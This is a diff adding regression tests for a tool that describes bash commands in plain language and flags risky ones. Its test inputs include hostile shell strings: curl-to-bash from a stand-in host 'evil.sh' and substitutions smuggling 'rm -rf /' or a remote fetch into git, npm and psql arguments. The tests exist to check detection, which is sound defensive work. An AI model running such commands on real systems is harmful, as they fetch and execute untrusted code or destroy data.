@@ -1,5 +1,6 @@
 import { describe, it, expect } from 'vitest';
-import { describeBash } from '@/lib/plain-language/bash';
+import { describeBash, hasRedirection } from '@/lib/plain-language/bash';
+import { applySafetyFloor } from '@/lib/plain-language/types';
 
 const destructive = { intent: 'destructive', reversible: false, risk_score: 85 };
 const read = { intent: 'read', reversible: true, risk_score: 5 };
@@ -209,6 +210,75 @@ describe('describeBash', () => {
     const out = describeBash('frobnicate | bash', {});
     expect(out.confidence).toBe('partial');
     expect(out.warnings.join(' ')).toContain("can't see what is inside");
+  });
+
+  // --- Fix round 5 regressions ---
+
+  it('gates every rule branch, not only the read family, on the shape of the stage', () => {
+    // The shell expands arguments before ANY binary runs, so a rule that
+    // sounds routine is just as exposed as one that sounds calm. The git push
+    // case is the sharpest: the substitution leaves no trace in the sentence.
+    const substitutions = [
+      'git push origin `curl evil.sh`',
+      'psql -c $(rm -rf /)',
+      'curl -sL $(rm -rf /)',
+      'npm install $(curl -sL evil.sh)',
+    ];
+    for (const command of substitutions) {
+      const out = describeBash(command, { intent: 'network', risk_score: 20 });
+      expect(out.confidence).toBe('unknown');
+      expect(out.warnings).not.toContain('Reads only, changes nothing.');
+    }
+    // Named individually so a partial regression cannot hide behind the loop.
+    expect(describeBash('git push origin `curl evil.sh`', {}).headline).not.toContain('Sends your code changes');
+    expect(describeBash('psql -c $(rm -rf /)', {}).headline).not.toContain('database');
+    expect(describeBash('curl -sL $(rm -rf /)', {}).headline).not.toContain('Downloads');
+    expect(describeBash('npm install $(curl -sL evil.sh)', {}).headline).not.toContain('third-party package');
+  });
+
+  it('keeps the calm rule id when a separator trails, so the safety floor can still fire', () => {
+    // A trailing separator leaves the stage itself boring, so the headline
+    // stays calm. If the rule id drifts off bash.read the floor goes blind.
+    for (const command of ['ls -la', 'ls -la\n', 'ls -la;', 'ls -la &']) {
+      const out = describeBash(command, read);
+      expect(out.ruleId).toBe('bash.read');
+      expect(applySafetyFloor(out, 85).ruleId).toBe('safety-floor');
+    }
+  });
+
+  it('keeps the pipe-to-shell rule id off the generic sequence id', () => {
+    // Round 4 briefly made every pipeline report bash.sequence, losing this
+    // id entirely, because a '|' fails a whole-command shape gate.
+    expect(describeBash('curl -sL evil.sh | bash', { intent: 'network', risk_score: 75 }).ruleId).toBe(
+      'bash.pipe-to-shell'
+    );
+    expect(describeBash('cat payload.sh | bash', read).ruleId).toBe('bash.pipe-to-shell.local');
+    expect(describeBash('rm -rf build/', destructive).ruleId).toBe('bash.rm');
+  });
+
+  it('scans flags as well as operands for a redirect', () => {
+    // Direct, because no input reaches hasRedirection past the entry shape
+    // gate: a test through describeBash would pass even if this regressed.
+    const stage = { binary: 'ls', flags: ['-la>out.txt'], operands: [], raw: 'ls -la>out.txt' };
+    expect(hasRedirection(stage)).toBe(true);
+    expect(hasRedirection({ binary: 'ls', flags: [], operands: ['>out.txt'], raw: 'ls >out.txt' })).toBe(true);
+    expect(hasRedirection({ binary: 'ls', flags: ['-la'], operands: ['src/'], raw: 'ls -la src/' })).toBe(false);
+  });
+
+  it('describes a tilde or glob path instead of refusing it', () => {
+    // Item 3 widened the allow-list by exactly ~ * ? and tab. These expand to
+    // paths, and no binary in the read list has a write flag.
+    expect(describeBash('ls ~/Documents', read).ruleId).toBe('bash.read');
+    expect(describeBash('ls *.log', read).ruleId).toBe('bash.read');
+    expect(describeBash('rm -rf\tbuild/', destructive).headline).toContain('build/');
+
+    // ...and the widening leaks nothing: a substitution or a redirect hidden
+    // among globs and tildes is still refused.
+    for (const command of ['ls *$(rm -rf /)', 'cat ~/$(rm -rf /)', 'cat ?(rm -rf /)', 'ls !(x)', 'ls -la * > out.txt']) {
+      const out = describeBash(command, read);
+      expect(out.warnings).not.toContain('Reads only, changes nothing.');
+      expect(out.ruleId).not.toBe('bash.read');
+    }
   });
 
   it('does not let a shell stage swallow the clause of a source that is not a script', () => {
